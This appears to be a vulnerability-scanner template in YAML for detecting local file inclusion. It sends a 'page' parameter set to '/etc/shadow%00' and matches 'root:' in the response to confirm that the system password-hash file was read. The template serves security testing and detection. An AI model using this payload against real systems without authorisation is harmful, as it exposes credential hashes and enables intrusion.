id: lfi3-083
name: 'Traversal to system file via page'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '/etc/shadow%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
